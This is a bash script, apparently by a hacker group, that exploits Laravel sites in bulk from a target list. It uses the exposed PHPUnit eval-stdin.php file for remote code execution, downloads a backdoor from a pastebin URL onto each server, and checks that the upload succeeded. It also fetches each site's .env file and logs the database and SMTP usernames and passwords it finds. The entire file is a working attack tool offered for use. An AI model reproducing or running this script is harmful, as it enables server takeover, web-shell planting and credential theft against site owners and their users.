#!/usr/bin/env bash
# Laravel PhpUnit Rce & Get Env
# Coded By Viloid
# Sec7or Team ~ Surabaya Hacker Link
# Usage : ./laraxpl.sh

R='\033[0;31m'
G='\e[32m'
O='\033[0;33m'
N='\033[0m'

header(){
cat <<EOF

+------------------------------------------------+
|	Laravel Rce & Get Env
|	Coded By : Viloid
|	Sec7or Team ~ Surabaya Hacker Link
+------------------------------------------------+

EOF
}

rce(){
	c="uname -a;curl -s https://pastebin.com/raw/f4xQX4sL -o cans.php"
	g=$(curl -s -d "<?php echo 'Cans21 :'.system('$c').':';?>" "$1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
	uname=$(echo $g | grep -oP 'Cans21 :\K[^:]+')
	if [[ ! -z $uname ]]; then
		rc="${G}RCE${N}"
		un="${G}[*] Kernel : $uname${N}${N}"
		if [[ $(curl -s $1/vendor/phpunit/phpunit/src/Util/PHP/cans.php | grep -ic "Cans21") -eq 1 ]]; then
			shell="${G}[*] Successfully Uploaded : ${O}$1/vendor/phpunit/phpunit/src/Util/PHP/cans.php${N}"
			echo "$1/vendor/phpunit/phpunit/src/Util/PHP/cans.php" >> laravel-rce-log.txt
		else
			shell="${R}[-] Failed Uploading Backdoor${N}"
		fi
		loc="\n$un\n$shell\n"
	else
		rc="${R}RCE${N}"
	fi
}

env(){
	g=$(curl -s "$1/.env")
	db_host=$(echo $g | grep -oP 'DB_HOST=\K[^ ]+')
	db=$(echo $g | grep -oP 'DB_DATABASE=\K[^ ]+')
	db_u=$(echo $g | grep -oP 'DB_USERNAME=\K[^ ]+')
	db_p=$(echo $g | grep -oP 'DB_PASSWORD=\K[^ ]+')	
	m_host=$(echo $g | grep -oP 'MAIL_HOST=\K[^ ]+')
	m_port=$(echo $g | grep -oP 'MAIL_PORT=\K[^ ]+')
	m_u=$(echo $g | grep -oP 'MAIL_USERNAME=\K[^ ]+')
	m_p=$(echo $g | grep -oP 'MAIL_PASSWORD=\K[^ ]+')

	if [[ -z $db_host ]]; then
		en="${R}DB${N}"
	else
		en="${G}DB${N}"
		dbs="${G}\n	[*] DB_HOST : $db_host\n	[*] DB_DATABASE : $db\n	[*] DB_USERNAME : $db_u\n	[*] DB_PASSWORD : $db_p\n${N}"
		echo "$1 | DATABASE : $db_host | $db | $db_u | $db_p" >> laravel-env-log.txt
		if [[ -z $m_host || $m_host == "null" || $m_host == "localhost" || $m_host == "mailtrap.io" || $m_host == "smtp.mailtrap.io" ]]; then
			sm="${R}SMTP${N}"
		else
			sm="${G}SMTP${N}"
			smtp="${G}\n	[*] MAIL_HOST : $m_host\n	[*] MAIL_PORT : $m_port\n	[*] MAIL_USERNAME : $m_u\n	[*] MAIL_PASSWORD : $m_p\n${N}"
			echo "$1 | SMTP : $m_host | $m_port | $m_u | $m_p" >> laravel-env-log.txt
		fi
	fi

}

exploit(){
	u=$(echo $1 | grep -Po '.*?//.*?(?=/)')
	env $u && rce $u
	echo -e "[$w][$2/$tot] $1 [$en][$sm][$rc]$dbs$smtp$loc"
}

header

read -p "[?] List Target : " l
if [[ ! -f $l ]]; then
	echo "[-] File $l Not Exist!"
	exit 1
fi

read -p "[?] Threads (Default 10): " t
if [[ $t="" ]]; then
	t=10;
fi

read -p "[?] Delay (Default 1): " s
if [[ $s="" ]]; then
	s=1;
fi

echo
echo -e "[!] ${G}Target Loaded : ${O}$(wc -l $l)${N}"
echo -e "[!] ${G}Thread : ${O}$t${N}"
echo -e "[!] ${G}Delay : ${O}$s sec${N}"
echo -e "[+] ${G}Start Exploit.......${N}\n"

n=1
IFS=$'\r\n'
for i in $(cat $l); do
	f=$(expr $n % $t)
	if [[ $f == 0 && $n > 0 ]]; then
		sleep $s
	fi
	w=$(date '+%H:%M:%S')
	tot=$(cat $l | wc -l)
	exploit $i $n &
	n=$[$n+1]
done
wait
